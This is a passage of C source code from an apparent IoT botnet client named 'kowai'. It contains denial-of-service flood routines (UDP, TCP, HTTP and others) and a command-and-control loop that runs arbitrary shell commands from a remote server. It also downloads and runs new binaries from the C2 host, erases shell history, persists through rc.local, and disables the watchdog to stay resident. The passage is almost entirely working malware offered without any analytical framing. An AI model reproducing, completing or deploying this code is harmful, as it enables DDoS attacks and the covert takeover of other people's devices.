    sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr * ) & dest_addr, sizeof(dest_addr));

    iph->saddr = htonl(GetRandomIP(netmask));
    iph->id = rand_cmwc();
    tcph->seq = rand_cmwc();
    tcph->source = rand_cmwc();
    tcph->check = 0;
    tcph->check = tcpcsum(iph, tcph);
    iph->check = csum((unsigned short * ) packet, iph->tot_len);

    if (i == pollRegister) {
      if (time(NULL) > end) break;
      i = 0;
      continue;
    }
    i++;
  }
}

void ClearHistory() {
  system("history -c;history -w");
  system("cd /root;rm -rf .bash_history");
}

void sendHTTP(unsigned char *ip, int port, int secs) {
	int i, sock;
	time_t start = time(NULL);
	
	char buffer[1];

    char request[512];
    const char *methods[] = {
        "GET",
        "HEAD",
        "POST"
    };
    const char *connections[] = {
        "close",
        "keep-alive",
        "accept"
    };
	
	int power = getdtablesize() / 2;
	for(i = 0; i < power; i++) {
		if(fork() == 0) {
			while(1) {
                sock = socket_connect(ip, port);
				if(sock != 0) {
                    strcpy(request, "");
                    strcpy(request + strlen(request), methods[rand() % (sizeof(methods) / sizeof(methods[0]))]);
                    strcpy(request + strlen(request), " / HTTP/1.1\r\nHost: ");
                    strcpy(request + strlen(request), ip);
                    strcpy(request + strlen(request), "\r\nUser-Agent: ");
                    strcpy(request + strlen(request), useragents[rand() % (sizeof(useragents) / sizeof(useragents[0]))]);
                    strcpy(request + strlen(request), "\r\nConnection: ");
                    strcpy(request + strlen(request), connections[rand() % (sizeof(connections) / sizeof(connections[0]))]);
                    strcpy(request + strlen(request), "\r\n\r\n");
                    write(sock, request, strlen(request));
                    read(sock, buffer, 1);
                    close(sock);
				}
				if(time(NULL) >= start + secs){
					_exit(0);
				}
			}
		}
	}
}

void sendCNC(unsigned char * ip, int port, int end_time) {
  int end = time(NULL) + end_time;
  int sockfd;
  struct sockaddr_in server;
  server.sin_addr.s_addr = inet_addr(ip);
  server.sin_family = AF_INET;
  server.sin_port = htons(port);
  while (end > time(NULL)) {
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    connect(sockfd, (struct sockaddr * ) & server, sizeof(server));
    sleep(1);
    close(sockfd);
  }
}
int findwritedir() {
	struct killerinfo *killi;
    DIR *dir;
    if ((dir = opendir("/tmp")) == NULL) {
		strcpy(killi->writedir, "/tmp/");
		return TRUE;
	}
	if((dir = opendir("/var/tmp")) == NULL) {
		strcpy(killi->writedir, "/var/tmp/");
		return TRUE;
	}
    return FALSE;
}
char *getArch() {
	char archhh[32];
	char *tmparch;
    #ifdef ARCH_MIPS
    tmparch = "kowaimips";
    #elif ARCH_MIPSEL
    tmparch = "kowaimpsl";
    #elif ARCH_SH4
    tmparch = "kowaish4";
    #elif ARCH_I5
    tmparch = "kowaix86";
    #elif ARCH_I6
    tmparch = "kowaii6";
    #elif ARCH_PPC
    tmparch = "kowaippc";
    #elif ARCH_M68K
    tmparch = "kowaim68k";
    #elif ARCH_SPARC
    tmparch = "kowaispc";
    #elif ARCH_ARM4
    tmparch = "kowaiarm";
    #elif ARCH_ARM5
    tmparch = "kowaiarm5";
    #elif ARCH_ARM6
    tmparch = "kowaiarm6";
	#elif ARCH_ARM7
	tmparch = "kowaiarm7";
	#else
	tmparch = "8UsA.sh";
    #endif
	strcpy(archhh, tmparch);
	return (char *)archhh;
}
int httpsocket(const char *host, int port, char *hpath, char *lpath) {
	char recvbuf[128];
    struct sockaddr_in addr;
    int sfd, ffd, ret;
    unsigned int header_parser = 0;
	
	addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = (int)inet_addr((const char*)host);;

    ffd = open(lpath, O_WRONLY | O_CREAT | O_TRUNC, 0777);

    sfd = socket(AF_INET, SOCK_STREAM, 0);

    #ifdef DEBUG
    if (ffd == -1)
        zprintf("Failed to open file!\n");
    if (sfd == -1)
        zprintf("Failed to call socket()\n");
    #endif

    if (sfd == -1 || ffd == -1)
        return FALSE;

    #ifdef DEBUG
    zprintf("Connecting to host...\n");
    #endif

    if ((ret = connect(sfd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in))) < 0)
    {
    #ifdef DEBUG
        zprintf("Failed to connect to host.\n");
    #endif
        return FALSE;
    }

    #ifdef DEBUG
    zprintf("Connected to host\n");
    #endif
	
    char *hostpath;
	strcpy(hostpath, "GET ");
	strcpy(hostpath + strlen(hostpath), hpath);
	strcpy(hostpath + strlen(hostpath), " HTTP/1.0\r\n\r\n");
    int hostpathlen = strlen(hostpath);
    if (write(sfd, hostpath, hostpathlen) != (hostpathlen))
    {
        #ifdef DEBUG
        zprintf("Failed to send get request.\n");
        #endif
		
        return FALSE;
    }
    
	#ifdef DEBUG
    zprintf("Started header parse...\n");
    #endif
	
    while (header_parser != 0x0d0a0d0a)
    {
        char ch;
        int ret = read(sfd, &ch, 1);

        if (ret != 1)
            return FALSE;
        header_parser = (header_parser << 8) | ch;
    }

    zprintf("Successfully downloaded file\n");

    while (1)
    {
        int ret = read(sfd, recvbuf, sizeof (recvbuf));

        if (ret <= 0)
            break;
        write(ffd, recvbuf, ret);
    }

    close(sfd);
    close(ffd);
	return TRUE;
}
void UpdateBins() {
    struct killerinfo *killi;
    findwritedir();
	chdir(killi->writedir);
	char *hostpath;
	char *exec;
	strcpy(hostpath, (char *)BINDIR);
	strcpy(hostpath, (char *)getArch());
    if(httpsocket(cncip, 80, hostpath, ECHOBIN)) {
        #ifdef DEBUG
		zprintf("Downloaded bin from tcp socket successfully");
		#endif
    } else {
		#ifdef DEBUG
		zprintf("Failed to download bin from tcp socket, bailing out");
		#endif
		chdir("/");
	    return;
	}
	#ifdef DEBUG
	zprintf("Executing New binary and exiting");
    #endif
	strcpy(exec, (char *)"./");
	strcpy(exec + strlen(exec), (char *)ECHOBIN);
    strcpy(exec + strlen(exec), (char *)" Kowai.old");
	system(exec);
	sockprintf(mainCommSock, "EXECUTED NEW BINARY");
	chdir("/");
    return;
}

void processCmd(int argc, unsigned char * argv[]) {
  if (!strcmp(argv[0], "PING")) {
    sockprintf(mainCommSock, "PONG!");
	return;
  }

  if (!strcmp(argv[0], "UPDATE")) {
    UpdateBins();
	kill(pgid * -1, 9);
    exit(0);
  }
/*
  if (!strcmp(argv[0], "TELSCAN")) {
    if (!strcmp(argv[1], "OFF")) {
      if (scanPid == 0) return;
      kill(scanPid, 9);
      sockprintf(mainCommSock, "STOPPING SCANNER");
      scanPid = 0;
    }
    if (!strcmp(argv[1], "ON")) {
      if (scanPid != 0) return;
      uint32_t parent;
      parent = fork();
      int threads = 500;
      int timeout = 60;
      if (parent > 0) {
        scanPid = parent;
        return;
      } else if (parent == -1) return;
      StartTheLelz(threads, timeout);
      _exit(0);
    }
  }*/
 

  if (!strcmp(argv[0], "KILLER")) {
    if (!strcmp(argv[1], "OFF")) {
      killer_kill();
      sockprintf(mainCommSock, "KILLER STOPPED");
    }
    if (!strcmp(argv[1], "ON")) {
      killer_init();
	  sockprintf(mainCommSock, "KILLER STARTED");
    }
	return;
  }

  if (!strcmp(argv[0], "GETPUBLICIP")) {
    sockprintf(mainCommSock, "My Public IP: %s", inet_ntoa(ourIP));
    return;
  }

  if (!strcmp(argv[0], "HOLD")) {
    if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
      return;
    }
    unsigned char * ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    if (strstr(ip, ",") != NULL) {
      unsigned char * hi = strtok(ip, ",");
      while (hi != NULL) {
        if (!listFork()) {
          sendHOLD(hi, port, time);
          _exit(0);
        }
        hi = strtok(NULL, ",");
      }
    } else {
      if (listFork()) {
        return;
      }
      sendHOLD(ip, port, time);
      _exit(0);
    }
	return;
  }
  if (!strcmp(argv[0], "JUNK")) {
    if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
      return;
    }
    unsigned char * ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    if (strstr(ip, ",") != NULL) {
      unsigned char * hi = strtok(ip, ",");
      while (hi != NULL) {
        if (!listFork()) {
          sendJUNK(hi, port, time);
          close(mainCommSock);
          _exit(0);
        }
        hi = strtok(NULL, ",");
      }
    } else {
      if (listFork()) {
        return;
      }
      sendJUNK(ip, port, time);
      _exit(0);
    }
	return;
  }

  if (!strcmp(argv[0], "UDP")) {
    if (argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
      return;
    }

    unsigned char * ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int spoofed = atoi(argv[4]);
    int packetsize = atoi(argv[5]);
    int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
    int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
    int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);

    if (strstr(ip, ",") != NULL) {
      unsigned char * hi = strtok(ip, ",");
      while (hi != NULL) {
        if (!listFork()) {
          sendUDP(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
          _exit(0);
        }
        hi = strtok(NULL, ",");
      }
    } else {
      if (!listFork()) {
        sendUDP(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
        _exit(0);
      }
    }
    return;
  }

  if (!strcmp(argv[0], "TCP")) {
    if (argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1)) {
      return;
    }

    unsigned char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int spoofed = atoi(argv[4]);
    unsigned char *flags = argv[5];

    int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
    int psize = argc > 6 ? atoi(argv[6]) : 0;

    if (strstr(ip, ",") != NULL) {
      unsigned char * hi = strtok(ip, ",");
      while (hi != NULL) {
        if (!listFork()) {
          sendTCP(hi, port, time, spoofed, flags, psize, pollinterval);
          _exit(0);
        }
        hi = strtok(NULL, ",");
      }
    } else {
      if (!listFork()) {
        sendTCP(ip, port, time, spoofed, flags, psize, pollinterval);
        _exit(0);
      }
    }
	return;
  }
  if (!strcmp(argv[0], "HTTP")) {
    if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
      return;
    }

    unsigned char * ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    if (strstr(ip, ",") != NULL) {
        unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
                sendHTTP(hi, port, time);
                hi = strtok(NULL, ",");
            }
    } else {
        sendHTTP(ip, port, time);
    }
	return;
  }

  if (!strcmp(argv[0], "CNC")) {
    if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
      return;
    }

    unsigned char * ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);

    if (strstr(ip, ",") != NULL) {
      unsigned char * hi = strtok(ip, ",");
      while (hi != NULL) {
        if (!listFork()) {
          sendCNC(hi, port, time);
          close(mainCommSock);
          _exit(0);
        }
        hi = strtok(NULL, ",");
      }
    } else {
      if (listFork()) {
        return;
      }

      sendCNC(ip, port, time);
      _exit(0);
    }
	return;
  }

  if (!strcmp(argv[0], "STD")) {
    if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
      return;
    }

    unsigned char * ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    if (strstr(ip, ",") != NULL) {
        unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
                sendSTD(hi, port, time);
                hi = strtok(NULL, ",");
            }
    } else {
        sendSTD(ip, port, time);
    }
	return;
  }


  if (!strcmp(argv[0], "STOPATTK")) {
    int killed = 0;
    unsigned long i;
    for (i = 0; i < numpids; i++) {
      if (pids[i] != 0 && pids[i] != getpid()) {
        kill(pids[i], 9);
        killed++;
      }
    }

    if (killed > 0) {
      sockprintf(mainCommSock, "Killed %d.", killed);
    } else {
      sockprintf(mainCommSock, "None Killed.");
    }
	return;
  }

/*  if (!strcmp(argv[0], "KILLME")) {
    sockprintf(mainCommSock, "ima dup kowai");
    kill(pgid * -1, 9);
    exit(0);
  }*/
}

int initConnection() {
  unsigned char server[4096];
  memset(server, 0, 4096);
  if (mainCommSock) {
    close(mainCommSock);
    mainCommSock = 0;
  }
  strcpy(server, cncip);
  mainCommSock = socket(AF_INET, SOCK_STREAM, 0);
  if (!connectTimeout(mainCommSock, server, cncport, 30)) return 1;
  return 0;
}

int getOurIP() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == -1) return 0;

    struct sockaddr_in serv;
    memset( & serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8");
    serv.sin_port = htons(53);

    int err = connect(sock, (const struct sockaddr * ) & serv, sizeof(serv));
    if (err == -1) return 0;

    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    err = getsockname(sock, (struct sockaddr * ) & name, & namelen);
    if (err == -1) return 0;

    ourIP.s_addr = name.sin_addr.s_addr;

    int cmdline = open("/proc/net/route", O_RDONLY);
    char linebuf[4096];
    while (fdgets(linebuf, 4096, cmdline) != NULL) {
      if (strstr(linebuf, "\t00000000\t") != NULL) {
        unsigned char * pos = linebuf;
        while ( * pos != '\t') pos++; * pos = 0;
        break;
      }
      memset(linebuf, 0, 4096);
    }
    close(cmdline);

    if ( * linebuf) {
      int i;
      struct ifreq ifr;
      strcpy(ifr.ifr_name, linebuf);
      ioctl(sock, SIOCGIFHWADDR, & ifr);
      for (i = 0; i < 6; i++) macAddress[i] = ((unsigned char * ) ifr.ifr_hwaddr.sa_data)[i];
    }

    close(sock);
  }

int main(int argc, char * argv[]) {
    char * mynameis = "";
    strncpy(argv[0], "", strlen(argv[0]));
    argv[0] = "";
    prctl(PR_SET_NAME, (unsigned long) mynameis, 0, 0, 0);
    srand(time(NULL) ^ getpid());
    init_rand(time(NULL) ^ getpid());
    int dupthing = 0;
    zprintf("kowai ohhhh that sad kid slump??");
	zprintf("\r\n");
	int wfd = 0;
	if ((wfd = open("/dev/watchdog", 2)) != -1 ||
        (wfd = open("/dev/misc/watchdog", 2)) != -1) {
        int one = 1;
        ioctl(wfd, 0x80045704, &one);
        int watchdog_fork;
		if((watchdog_fork = fork()) == 0) {
			while(1){
				ioctl(wfd, 0x80045705, 0); // Sending Keep-alive call to device
                sleep(10);
			}
		}
    }
	char cwd[256],*str;
    FILE *file;
    str="/etc/rc.d/rc.local";
    file=fopen(str,"r");
    if (file == NULL) {
        str="/etc/rc.conf";
        file=fopen(str,"r");
    }
    if (file != NULL) {
        char outfile[256], buf[1024];
        int i=strlen(argv[0]), d=0;
        getcwd(cwd,256);
        if (strcmp(cwd,"/")) {
            while(argv[0][i] != '/') i--;
            sprintf(outfile,"\"%s%s\"\n",cwd,argv[0]+i);
            while(!feof(file)) {
                fgets(buf,1024,file);
                if (!strcasecmp(buf,outfile)) d++;
            }
            if (d == 0) {
                FILE *out;
                fclose(file);
                out=fopen(str,"a");
                if (out != NULL) {
                    fputs(outfile,out);
                    fclose(out);
                }
            }
            else fclose(file);
        }
        else fclose(file);
    }
    getOurIP();
	#ifndef DEBUG
    if (fork() > 0)
        return 0;
    pgid = setsid();
	chdir("/");
	#endif
    //killer_init();
	
    signal(SIGPIPE, SIG_IGN);

  while (1) {
    if (initConnection()) {
      sleep(5);
      continue;
    }
    sockprintf(mainCommSock, "\x1b[1;35mJoining\x1b[1;32m > \x1b[90m[\x1b[1;33m%s\x1b[90m]  \x1b[0m", (char *)inet_ntoa(ourIP), (char *)VERSION);
    char commBuf[4096];
    int got = 0;
    int i = 0;
    while ((got = recvLine(mainCommSock, commBuf, 4096)) != -1) {
      for (i = 0; i < numpids; i++)
        if (waitpid(pids[i], NULL, WNOHANG) > 0) {
          unsigned int * newpids, on;
          for (on = i + 1; on < numpids; on++) pids[on - 1] = pids[on];
          pids[on - 1] = 0;
          numpids--;
          newpids = (unsigned int * ) malloc((numpids + 1) * sizeof(unsigned int));
          for (on = 0; on < numpids; on++) newpids[on] = pids[on];
          free(pids);
          pids = newpids;
        }

      commBuf[got] = 0x00;

      trim(commBuf);

      if (strstr(commBuf, "PING") == commBuf) {
        sockprintf(mainCommSock, "PONG");
        continue;
      }
	  /*
      if (strstr(commBuf, "KILLME") == commBuf) {
        dupthing++;
        zprintf("\n");
        if (dupthing > 20) {
          exit(0);
        }
        break;
      }*/

      unsigned char * message = commBuf;

      if ( * message == '!') {
        unsigned char * nickMask = message + 1;
        while ( * nickMask != ' ' && * nickMask != 0x00) nickMask++;
        if ( * nickMask == 0x00) continue; * (nickMask) = 0x00;
        nickMask = message + 1;

        message = message + strlen(nickMask) + 2;
        while (message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;

        unsigned char * command = message;
        while ( * message != ' ' && * message != 0x00) message++; * message = 0x00;
        message++;

        unsigned char * tmpcommand = command;
        while ( * tmpcommand) { * tmpcommand = toupper( * tmpcommand);
          tmpcommand++;
        }

        if (strcmp(command, "CMD") == 0) {
          unsigned char buf[1024];
          int command;
          if (listFork()) continue;
          memset(buf, 0, 1024);
          szprintf(buf, "%s 2>&1", message);
          command = fdpopen(buf, "r");
          while (fdgets(buf, 1024, command) != NULL) {
            trim(buf);
            sockprintf(mainCommSock, "%s", buf);
            memset(buf, 0, 1024);
            sleep(1);
          }
          fdpclose(command);
          exit(0);
        }

        unsigned char * params[10];
        int paramsCount = 1;
        unsigned char * pch = strtok(message, " ");
        params[0] = command;

        while (pch) {
          if ( * pch != '\n') {
            params[paramsCount] = (unsigned char * ) malloc(strlen(pch) + 1);
            memset(params[paramsCount], 0, strlen(pch) + 1);
            strcpy(params[paramsCount], pch);
            paramsCount++;
          }
          pch = strtok(NULL, " ");
        }

        processCmd(paramsCount, params);

        if (paramsCount > 1) {
          int q = 1;
          for (q = 1; q < paramsCount; q++) {
            free(params[q]);
          }
        }
      }
    }
  }

  return 0;
  zprintf("client exiting");
}